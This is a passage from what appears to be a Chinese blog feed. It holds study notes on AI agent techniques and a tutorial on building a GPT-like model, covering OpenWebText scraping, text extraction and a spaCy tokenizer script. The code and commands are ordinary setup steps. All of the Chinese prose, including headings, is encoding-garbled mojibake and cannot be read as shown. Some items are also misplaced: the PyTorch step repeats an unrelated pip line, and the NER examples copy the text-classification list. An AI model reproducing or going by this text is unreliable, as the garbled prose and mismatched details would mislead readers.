·</p><ul><li>å…³é”®ç»„ä»¶ï¼š<ul><li>å·ç§¯å±‚</li><li>æ± åŒ–å±‚</li><li>å…¨è¿æ¥å±‚</li></ul></li></ul><p><strong>å¾ªç¯ç¥ç»ç½‘ç»œ (RNN)ï¼š</strong>é€‚ç”¨äºå¤„ç†åºåˆ—æ•°æ®ï¼Œå¦‚æ—¶é—´åºåˆ—æˆ–è‡ªç„¶è¯­è¨€ã€‚èƒ½å¤„ç†å˜é•¿åºåˆ—ã€å…·æœ‰å†…éƒ¨çŠ¶æ€ï¼ˆè®°å¿†ï¼‰ã€å¯ä»¥æ•æ‰é•¿æœŸä¾èµ–å…³ç³»ã€‚</p><ul><li>å˜ä½“ï¼š<ul><li>é•¿çŸ­æœŸè®°å¿†ç½‘ç»œï¼ˆLSTMï¼‰</li><li>é—¨æ§å¾ªç¯å•å…ƒï¼ˆGRUï¼‰</li></ul></li></ul><p><strong>æ³¨æ„åŠ›æœºåˆ¶ä¸ Transformerï¼š</strong>èƒ½å¶å¹¶è¡Œå¤„ç†åºåˆ—ã€æ•æ‰é•¿è·ç¦»ä¾èµ–ã€è®¡ç®—æ•ˆç‡é«˜ã€‚</p><p>æ³¨æ„åŠ›æœºåˆ¶å…è®¸æ¨¡å‹åœ¨å¤„ç†è¾“å…¥æ—¶å…³æ³¨æœ€ç›¸å…³çš„éƒ¨åˆ†ã€‚</p><p>Transformeræ¶æ„åŸºäºè‡ªæ³¨æ„åŠ›æœºåˆ¶ï¼Œåœ¨å„ç§NLPä»»åŠ¡ä¸­å–å¾—äº†çªç ´æ€§è¿›å±•ã€‚</p><h3 id="è‡ªç„¶è¯­è¨€å¤„ç†-NLP"><a href="#è‡ªç„¶è¯­è¨€å¤„ç†-NLP" class="headerlink" title="è‡ªç„¶è¯­è¨€å¤„ç† (NLP)"></a><strong>è‡ªç„¶è¯­è¨€å¤„ç† (NLP)</strong></h3><p>è‡ªç„¶è¯­è¨€å¤„ç†æ˜¯AI Agentä¸äººç±»è¿›è¡Œè¯­è¨€äº¤äº’çš„å…³é”®æŠ€æœ¯ã€‚å®ƒä½¿Agentèƒ½å¤Ÿç†è§£ã€ç”Ÿæˆå’Œå¤„ç†äººç±»è¯­è¨€ã€‚</p><p><strong>æ–‡æœ¬åˆ†ç±»ï¼š</strong>æ–‡æœ¬åˆ†ç±»æ˜¯NLPçš„åŸºç¡€ä»»åŠ¡ä¹‹ä¸€ï¼Œå®ƒå°†æ–‡æœ¬åˆ†é…åˆ°é¢„å®šä¹‰çš„ç±»åˆ«ä¸­ã€‚</p><ul><li>æƒ…æ„Ÿåˆ†æ</li><li>åƒåœ¾é‚®ä»¶æ£€æµ‹</li><li>æ–°é—»åˆ†ç±»</li></ul><p><strong>å‘½åå®ä½“è¯†åˆ«NERï¼š</strong>è¯†åˆ«æ–‡æœ¬ä¸­çš„å‘½åå®ä½“ï¼ˆå¦‚äººåã€åœ°åã€ç»„ç»‡åç­‰ï¼‰å¹¶å°†å…¶åˆ†ç±»çš„ä»»åŠ¡ã€‚</p><ul><li>æƒ…æ„Ÿåˆ†æ</li><li>åƒåœ¾é‚®ä»¶æ£€æµ‹</li><li>æ–°é—»åˆ†ç±»</li></ul><p><strong>æƒ…æ„Ÿåˆ†æï¼š</strong>æ—¨åœ¨ç¡®å®šæ–‡æœ¬ä¸­è¡¨è¾¾çš„æƒ…æ„Ÿæ€åº¦ï¼ˆå¦‚ç§¯æã€æ¶ˆææˆ–ä¸­æ€§ï¼‰ã€‚</p><ul><li>ç¤¾äº¤åª’ä½“ç›‘æ§</li><li>å®¢æˆ·åé¦ˆåˆ†æ</li><li><p>å¸‚åœºç ”ç©¶</p><p><strong>æœºå™¨ç¿»è¯‘ï¼š</strong>å°†æ–‡æœ¬ä»ä¸€ç§è¯­è¨€è‡ªåŠ¨ç¿»è¯‘æˆå¦ä¸€ç§è¯­è¨€çš„ä»»åŠ¡ã€‚</p></li><li><p>è·¨è¯­è¨€é€šä¿¡</p></li><li>å¤šè¯­è¨€å†…å®¹åˆ›å»º</li><li>å›½é™…å•†åŠ¡</li></ul><h3 id="è®¡ç®—æœºè§†è§‰"><a href="#è®¡ç®—æœºè§†è§‰" class="headerlink" title="è®¡ç®—æœºè§†è§‰"></a><strong>è®¡ç®—æœºè§†è§‰</strong></h3><p>è®¡ç®—æœºè§†è§‰ä½¿AI Agentèƒ½å¤Ÿç†è§£å’Œå¤„ç†è§†è§‰ä¿¡æ¯ã€‚</p><p><strong>å›¾åƒåˆ†ç±»ï¼š</strong>è¯†åˆ«å›¾åƒä¸­ä¸»è¦å¯¹è±¡æˆ–åœºæ™¯çš„ä»»åŠ¡ã€‚</p><ul><li>åŒ»å­¦è¯Šæ–­</li><li>è‡ªåŠ¨æ ‡è®°</li><li>å†…å®¹è¿‡æ»¤</li></ul><p><strong>ç›®æ ‡æ£€æµ‹ï¼š</strong>è¯†åˆ«å›¾åƒä¸­çš„å¯¹è±¡&amp;å®šä½å®ƒä»¬çš„ä½ç½®ã€‚</p><ul><li>è‡ªåŠ¨é©¾é©¶</li><li>å®‰å…¨ç›‘æ§</li><li>é›¶å”®åˆ†æ</li></ul><p><strong>å›¾åƒåˆ†å‰²ï¼š</strong>å°†å›¾åƒåˆ’åˆ†ä¸ºå¤šä¸ªè¯­ä¹‰åŒºåŸŸï¼Œä¸ºæ¯ä¸ªåƒç´ åˆ†é…ä¸€ä¸ªç±»åˆ«æ ‡ç­¾ã€‚</p><ul><li>åŒ»å­¦å›¾åƒåˆ†æ</li><li>è‡ªåŠ¨é©¾é©¶åœºæ™¯ç†è§£</li><li>å¢å¼ºç°å®</li></ul><p><strong>äººè„¸è¯†åˆ«ï¼š</strong>æ¶‰åŠæ£€æµ‹ã€å¯¹é½å’Œè¯†åˆ«äººè„¸ã€‚</p><ul><li>å®‰å…¨ç³»ç»Ÿ</li><li>ç”¨æˆ·è®¤è¯</li><li>ç¤¾äº¤åª’ä½“æ ‡è®°</li></ul><h3 id="å†³ç­–ä¸è§„åˆ’"><a href="#å†³ç­–ä¸è§„åˆ’" class="headerlink" title="å†³ç­–ä¸è§„åˆ’"></a><strong>å†³ç­–ä¸è§„åˆ’</strong></h3><p>AI Agentè‡ªä¸»è¡ŒåŠ¨çš„æ ¸å¿ƒèƒ½åŠ›ï¼Œä½¿å…¶èƒ½å¤Ÿåœ¨å¤æ‚ç¯å¢ƒä¸­åšå‡ºæ˜æ™ºçš„é€‰æ‹©å¹¶åˆ¶å®šé•¿æœŸç­–ç•¥ã€‚</p><p><strong>å†³ç­–æ ‘ï¼š</strong>ä¸€ç§ç›´è§‚çš„å†³ç­–æ¨¡å‹ï¼Œé€‚ç”¨äºåˆ†ç±»å’Œå›å½’ä»»åŠ¡ã€‚</p><ul><li>é£é™©è¯„ä¼°</li><li>å®¢æˆ·åˆ†ç±»</li><li>åŒ»ç–—è¯Šæ–­</li></ul><p><strong>è’™ç‰¹å¡æ´›æ ‘æœç´¢ï¼ˆMCTSï¼‰</strong>ï¼šä¸€ç§ç”¨äºå†³ç­–è¿‡ç¨‹çš„å¯å‘å¼æœç´¢ç®—æ³•ï¼Œç‰¹åˆ«é€‚ç”¨äºå…·æœ‰å¤§çŠ¶æ€ç©ºé—´çš„é—®é¢˜ã€‚</p><ul><li>æ¸¸æˆAIï¼ˆå¦‚å›´æ£‹ï¼‰</li><li>è·¯å¾„è§„åˆ’</li><li>èµ„æºåˆ†é…</li></ul><p><strong>A*ç®—æ³•</strong>ï¼šä¸€ç§ç”¨äºå›¾å½¢æœç´¢å’Œè·¯å¾„è§„åˆ’çš„å¯å‘å¼ç®—æ³•ã€‚</p><ul><li>å¯¼èˆªç³»ç»Ÿ</li><li>æœºå™¨äººè·¯å¾„è§„åˆ’</li><li>æ¸¸æˆAIå¯»è·¯</li></ul><script src="https://giscus.app/client.js"        data-repo="Samsara-lo/Samsara-lo.github.io"        data-repo-id="R_kgDONimTFg"        data-category="General"        data-category-id="DIC_kwDONimTFs4CorbM"        data-mapping="pathname"        data-strict="0"        data-reactions-enabled="1"        data-emit-metadata="0"        data-input-position="bottom"        data-theme="light_high_contrast"        data-lang="zh-CN"        crossorigin="anonymous"        async></script>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®°æ•´ç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AIå®‰å…¨ </tag>
            
            <tag> AI agent </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»é›¶å¼€å§‹çš„å¤§æ¨¡å‹æ­å»ºä¹‹æ—…</title>
      <link href="/2025/01/31/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%B9%8B%E6%97%85/"/>
      <url>/2025/01/31/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€æ­å»ºå¼€å‘ç¯å¢ƒ"><a href="#ä¸€ã€æ­å»ºå¼€å‘ç¯å¢ƒ" class="headerlink" title="ä¸€ã€æ­å»ºå¼€å‘ç¯å¢ƒ"></a>ä¸€ã€æ­å»ºå¼€å‘ç¯å¢ƒ</h1><ul><li><h2 id="python3"><a href="#python3" class="headerlink" title="python3"></a><strong>python3</strong></h2></li><li><h2 id="pytorch"><a href="#pytorch" class="headerlink" title="pytorch"></a><strong>pytorch</strong></h2></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install numpy tqdm matplotlib</span><br></pre></td></tr></table></figure><ul><li><h2 id="ä¾èµ–åº“"><a href="#ä¾èµ–åº“" class="headerlink" title="ä¾èµ–åº“"></a><strong>ä¾èµ–åº“</strong></h2></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install numpy tqdm matplotlib</span><br></pre></td></tr></table></figure><ul><li><h2 id="vscode-Jupyter"><a href="#vscode-Jupyter" class="headerlink" title="vscode / Jupyter"></a><strong>vscode / Jupyter</strong></h2></li></ul><h1 id="äºŒã€å‡†å¤‡ä¸€ä¸ªæ•°æ®é›†"><a href="#äºŒã€å‡†å¤‡ä¸€ä¸ªæ•°æ®é›†" class="headerlink" title="äºŒã€å‡†å¤‡ä¸€ä¸ªæ•°æ®é›†"></a>äºŒã€å‡†å¤‡ä¸€ä¸ªæ•°æ®é›†</h1><ul><li><a href="https://blog.salesforceairesearch.com/the-wikitext-long-term-dependency-language-modeling-dataset/">WikiText</a></li><li><a href="https://github.com/jcpeterson/openwebtext">OpenWebText</a></li><li>anythingelse</li></ul><h2 id="1-å‡†å¤‡ç¯å¢ƒï¼ˆä»¥openwebtextä¸ºä¾‹ï¼‰"><a href="#1-å‡†å¤‡ç¯å¢ƒï¼ˆä»¥openwebtextä¸ºä¾‹ï¼‰" class="headerlink" title="1.å‡†å¤‡ç¯å¢ƒï¼ˆä»¥openwebtextä¸ºä¾‹ï¼‰"></a>1.å‡†å¤‡ç¯å¢ƒï¼ˆä»¥openwebtextä¸ºä¾‹ï¼‰</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/JCPETERSON/OpenwebText.git</span><br><span class="line"><span class="built_in">cd</span> OpenwebText</span><br></pre></td></tr></table></figure><p>pythonç‰ˆæœ¬å¾—é«˜ä¸€ç‚¹ï¼Œæˆ‘ç”¨çš„3.12ï¼Œ3.8ä¸è¡Œã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>å¦‚æœè€æŠ¥é”™ç‰ˆæœ¬é—®é¢˜å°±ç›´æ¥ä¸‹ï¼ˆæ²¡æŠ¥é”™å°±ä¸æ”¹ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install beautifulsoup4 certifi chardet cssselect feedfinder2 feedparser htmlmin idna jieba3k lxml newspaper3k nltk numpy pandas pillow python-dateutil pytorch-pretrained-bert pytz pyyaml recordtype requests-file requests singledispatch six soupsieve spacy tinysegmenter tldextract tqdm urllib3 urlparse2 pycurl pebble chardet transformers</span><br></pre></td></tr></table></figure><h2 id="2-åŠ è½½-amp-é¢„å¤„ç†æ•°æ®"><a href="#2-åŠ è½½-amp-é¢„å¤„ç†æ•°æ®" class="headerlink" title="2.åŠ è½½&amp;é¢„å¤„ç†æ•°æ®"></a>2.åŠ è½½&amp;é¢„å¤„ç†æ•°æ®</h2><h3 id="1-ã€ç›´æ¥ä¸‹è½½Pushshift-æ•°æ®"><a href="#1-ã€ç›´æ¥ä¸‹è½½Pushshift-æ•°æ®" class="headerlink" title="(1)ã€ç›´æ¥ä¸‹è½½Pushshift æ•°æ®"></a>(1)ã€ç›´æ¥ä¸‹è½½<a href="https://mega.nz/folder/EZZD0YwJ#9_PlEQzdMVLaNdKv_ICNVQ">Pushshift æ•°æ®</a></h3><p>è¿™é‡Œé¢çš„urlæ˜¯å·²ç»å»é‡äº†çš„ï¼Œæ­£å¸¸æµç¨‹å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">æå– URL</span><br><span class="line">python extract_urls.py --single_file pushshift_dumps/RS_v2_2005-06.xz</span><br><span class="line"></span><br><span class="line">æƒ³æå–ä¸€ä¸ªæ—¶é—´èŒƒå›´å†…çš„ URL</span><br><span class="line">python extract_urls.py --year_start 2016 --year_end 2018</span><br><span class="line"></span><br><span class="line">å»é‡ URL</span><br><span class="line">python deduplicate_urls.py --input_dir url_dumps</span><br></pre></td></tr></table></figure><h3 id="2-ã€ä¸‹è½½HTMLæ•°æ®"><a href="#2-ã€ä¸‹è½½HTMLæ•°æ®" class="headerlink" title="(2)ã€ä¸‹è½½HTMLæ•°æ®"></a>(2)ã€ä¸‹è½½HTMLæ•°æ®</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python312 download.py D:\Tools\openwebtext\URLs\RS_2011-01.bz2.deduped.txt --n_procs 100 --scraper raw --chunk_size 100000 --compress --<span class="built_in">timeout</span> 30</span><br></pre></td></tr></table></figure><p>å°†æŠ“å–çš„ HTML é¡µé¢å­˜å‚¨åœ¨ <code>scraped</code> æ–‡ä»¶å¤¹ä¸­ï¼Œå¹¶å‹ç¼©å­˜æ¡£ã€‚</p><p>ç­‰æŒºä¹…çš„ï¼ŒæŒ‚ç€ç¡è§‰äº†ã€‚é»˜è®¤å®ƒdoneäº†å°±æ˜¯å¥½äº†ï¼ˆï¼‰</p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501281514200.png" alt="1738029502506.png"></p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501281515362.png" alt="1738029524605.png"></p><h3 id="3-ã€ä»HTMLä¸­æå–æ–‡æœ¬"><a href="#3-ã€ä»HTMLä¸­æå–æ–‡æœ¬" class="headerlink" title="(3)ã€ä»HTMLä¸­æå–æ–‡æœ¬"></a>(3)ã€ä»HTMLä¸­æå–æ–‡æœ¬</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade newspaper3k</span><br></pre></td></tr></table></figure><p>æŠŠextract_text.pyé‡Œçš„save_parsed_fileæ”¹æˆå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">save_parsed_file</span>(<span class="params">filename, text, out_dir</span>):</span><br><span class="line">    <span class="comment"># è·å–æ–‡ä»¶çš„å®Œæ•´è·¯å¾„</span></span><br><span class="line">    file_path = os.path.join(out_dir, filename)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ç¡®ä¿ç›®å½•å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»º</span></span><br><span class="line">    os.makedirs(os.path.dirname(file_path), exist_ok=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å†™å…¥æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> handle:</span><br><span class="line">        handle.write(text)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501281514962.png" alt="1738048415160.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python312 extract_text.py --html_archive scraped/RS_2011-01-1_data.xz --n_procs 100</span><br></pre></td></tr></table></figure><p>ä» HTML ä¸­æå–å‡ºæ–‡æœ¬å†…å®¹å¹¶ä¿å­˜ä¸º <code>.txt</code> æ–‡ä»¶.</p><p>â€”å¦‚æœä¸­é—´æœ‰æŠ¥é”™é‡æ–°æ¥çš„è¯ï¼Œè®°å¾—æŠŠåŸæ¥æå–çš„æ–‡ä»¶åˆ æ‰ï¼Œæ–‡ä»¶å¤¹åœ¨scrapedé‡Œ</p><h3 id="4-ã€åˆ†è¯å¤„ç†"><a href="#4-ã€åˆ†è¯å¤„ç†" class="headerlink" title="(4)ã€åˆ†è¯å¤„ç†"></a>(4)ã€åˆ†è¯å¤„ç†</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m spacy download en_core_web_sm</span><br></pre></td></tr></table></figure><p>æ›´æ”¹tokenize_text.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> spacy</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> partial</span><br><span class="line"><span class="keyword">import</span> chardet</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detect_encoding</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ£€æµ‹æ–‡ä»¶çš„å®é™…ç¼–ç &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        raw_data = f.read(<span class="number">1024</span>)  <span class="comment"># è¯»å–æ–‡ä»¶çš„å‰ 1KB æ•°æ®</span></span><br><span class="line">    result = chardet.detect(raw_data)</span><br><span class="line">    <span class="keyword">return</span> result[<span class="string">&#x27;encoding&#x27;</span>] <span class="keyword">or</span> <span class="string">&#x27;utf-8&#x27;</span>  <span class="comment"># å¦‚æœæ£€æµ‹å¤±è´¥ï¼Œé»˜è®¤è¿”å› &#x27;utf-8&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_tokenized_text</span>(<span class="params">output_dir, filename, text</span>):</span><br><span class="line">    <span class="comment"># æ„å»ºå®Œæ•´è¾“å‡ºè·¯å¾„</span></span><br><span class="line">    text_file = os.path.join(output_dir, filename)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç¡®ä¿ç›®æ ‡ç›®å½•å­˜åœ¨</span></span><br><span class="line">    os.makedirs(os.path.dirname(text_file), exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¿å­˜æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">with</span> io.<span class="built_in">open</span>(text_file, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fo:</span><br><span class="line">        fo.write(text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tokenizeSpacy</span>(<span class="params">args</span>):</span><br><span class="line">    nlp = spacy.load(<span class="string">&quot;en_core_web_sm&quot;</span>)  <span class="comment"># åŠ è½½ spaCy æ¨¡å‹</span></span><br><span class="line">    extraction_file_paths = glob.glob(args.input_glob)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> extraction_file_path <span class="keyword">in</span> extraction_file_paths:</span><br><span class="line">        path, filename = os.path.split(extraction_file_path)</span><br><span class="line">        text_file = os.path.join(</span><br><span class="line">            args.output_dir, filename.replace(<span class="string">&#x27;.txt&#x27;</span>, <span class="string">&#x27;.tokenized.txt&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç¡®ä¿è¾“å‡ºç›®å½•å­˜åœ¨</span></span><br><span class="line">        os.makedirs(os.path.dirname(text_file), exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ£€æµ‹æ–‡ä»¶ç¼–ç </span></span><br><span class="line">        file_encoding = detect_encoding(extraction_file_path)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># æ‰“å¼€è¾“å…¥æ–‡ä»¶å’Œè¾“å‡ºæ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">with</span> io.<span class="built_in">open</span>(extraction_file_path, <span class="string">&#x27;r&#x27;</span>, encoding=file_encoding) <span class="keyword">as</span> fi, \</span><br><span class="line">                    io.<span class="built_in">open</span>(text_file, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fo:</span><br><span class="line"></span><br><span class="line">                omitted_line_count = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> fi:</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(line.strip()) &gt; <span class="number">0</span>:  <span class="comment"># å¿½ç•¥ç©ºè¡Œ</span></span><br><span class="line">                        doc = nlp(line)</span><br><span class="line">                        fo.write(<span class="string">&#x27; &#x27;</span>.join([x.text <span class="keyword">for</span> x <span class="keyword">in</span> doc]) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        omitted_line_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Omitted <span class="subst">&#123;omitted_line_count&#125;</span> empty lines from <span class="subst">&#123;filename&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Failed to decode <span class="subst">&#123;extraction_file_path&#125;</span> with encoding <span class="subst">&#123;file_encoding&#125;</span>. Skipping this file.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--input_glob&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;*.txt&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--output_dir&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;tokenized&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--tokenizer&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;spacy&#x27;</span>, choices=[<span class="string">&#x27;spacy&#x27;</span>, <span class="string">&#x27;gpt2&#x27;</span>])</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--combine&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">1e8</span>, <span class="built_in">help</span>=<span class="string">&quot;min tokens per file in gpt2 mode&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--file_bs&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">10000</span>, <span class="built_in">help</span>=<span class="string">&quot;files per batch in gpt2 mode&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è§£æå‘½ä»¤è¡Œå‚æ•°</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç¡®ä¿è¾“å‡ºç›®å½•å­˜åœ¨</span></span><br><span class="line">    os.makedirs(args.output_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ ¹æ® tokenizer é€‰æ‹©æ‰§è¡Œçš„å‡½æ•°</span></span><br><span class="line">    <span class="keyword">if</span> args.tokenizer == <span class="string">&#x27;spacy&#x27;</span>:</span><br><span class="line">        tokenizeSpacy(args)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;GPT-2 tokenizer is not implemented in this version.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python312 tokenize_text.py --input_glob <span class="string">&quot;parsed/RS_2011-01/*.txt&quot;</span> --output_dir tokenized</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501282028656.png" alt="1738067274379.png"></p><h1 id="ä¸‰ã€æ„å»ºå’Œè®­ç»ƒ-GPT-ç±»ä¼¼æ¨¡å‹"><a href="#ä¸‰ã€æ„å»ºå’Œè®­ç»ƒ-GPT-ç±»ä¼¼æ¨¡å‹" class="headerlink" title="ä¸‰ã€æ„å»ºå’Œè®­ç»ƒ GPT ç±»ä¼¼æ¨¡å‹"></a>ä¸‰ã€æ„å»ºå’Œè®­ç»ƒ GPT ç±»ä¼¼æ¨¡å‹</h1><p>ä¸‹é¢çš„æ–‡ä»¶å±‚çº§å…³ç³»å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gpt_project/</span><br><span class="line">â”œâ”€â”€ model/</span><br><span class="line">â”‚   â”œâ”€â”€ gpt.py</span><br><span class="line">â”‚   â”œâ”€â”€ transformer_block.py</span><br><span class="line">â”œâ”€â”€ data/</span><br><span class="line">â”‚   â”œâ”€â”€ dataset.py</span><br><span class="line">â”‚   â”œâ”€â”€ tokenizer.py  # å¯é€‰</span><br><span class="line">â”‚   â”œâ”€â”€ tokenized/  # å­˜æ”¾æ‰€æœ‰åˆ†è¯å¥½çš„ .txt æ–‡ä»¶</span><br><span class="line">â”œâ”€â”€ train/</span><br><span class="line">â”‚   â”œâ”€â”€ train.py  # 